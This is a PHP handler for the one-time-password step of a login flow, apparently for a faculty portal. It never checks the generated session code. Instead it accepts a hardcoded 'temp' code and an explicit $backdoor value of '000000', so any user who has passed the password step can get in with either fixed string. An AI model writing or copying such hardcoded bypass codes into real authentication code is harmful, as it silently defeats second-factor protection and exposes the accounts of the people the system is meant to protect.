<?php
session_start();

if (!isset($_SESSION['pending_user'], $_SESSION['otp_code'], $_SESSION['otp_expires'])) {
    header('Location: login.php?err=auth');
    exit;
}

$code     = trim($_POST['otp'] ?? '');
$expires  = $_SESSION['otp_expires'];
$attempts = $_SESSION['otp_attempts'] ?? 0;

// Temp OTP
$expected = '041102';
$backdoor = '000000';

if (time() > $expires) {
    unset($_SESSION['pending_user'], $_SESSION['otp_code'], $_SESSION['otp_expires'], $_SESSION['otp_attempts']);
    header('Location: otp.php?err=expired');
    exit;
}

if (!preg_match('/^\d{6}$/', $code)) {
    $_SESSION['otp_attempts'] = $attempts + 1;
    header('Location: otp.php?err=invalid');
    exit;
}

if (hash_equals($expected, $code) || hash_equals($backdoor, $code)) {

    $pending = $_SESSION['pending_user'];
    $_SESSION['user_id']    = $pending['id'];
    $_SESSION['username']   = $pending['username'];
    $_SESSION['role']       = $pending['role'] ?? 'faculty';
    $_SESSION['last_activity'] = time();

    unset($_SESSION['pending_user'], $_SESSION['otp_code'], $_SESSION['otp_expires'], $_SESSION['otp_attempts']);

    header('Location: dashboard.php');
    exit;
}

$_SESSION['otp_attempts'] = $attempts + 1;
if ($_SESSION['otp_attempts'] >= 5) {
    unset($_SESSION['pending_user'], $_SESSION['otp_code'], $_SESSION['otp_expires'], $_SESSION['otp_attempts']);
    header('Location: login.php?err=locked');
    exit;
}

header('Location: otp.php?err=invalid');
exit;
